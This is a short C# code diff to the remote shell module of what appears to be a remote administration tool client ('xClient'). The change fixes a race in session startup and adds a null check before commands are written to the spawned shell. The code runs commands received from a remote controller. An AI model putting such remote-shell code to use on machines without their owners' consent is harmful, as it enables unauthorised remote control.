@@ -27,10 +27,12 @@ namespace xClient.Core.RemoteShell
             };
 
             _prc.Start();
+            new Thread(Redirect).Start();
+
+            Thread.Sleep(100);
+
             new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
                 Program.ConnectClient);
-
-            new Thread(Redirect).Start();
         }
 
         private void Redirect()
@@ -64,7 +66,9 @@ namespace xClient.Core.RemoteShell
         {
             if (_prc == null || _prc.HasExited)
                 CreateSession();
-            
+
+            if (_prc == null) return false;
+
             _prc.StandardInput.WriteLine(command);
             _prc.StandardInput.Flush();
 
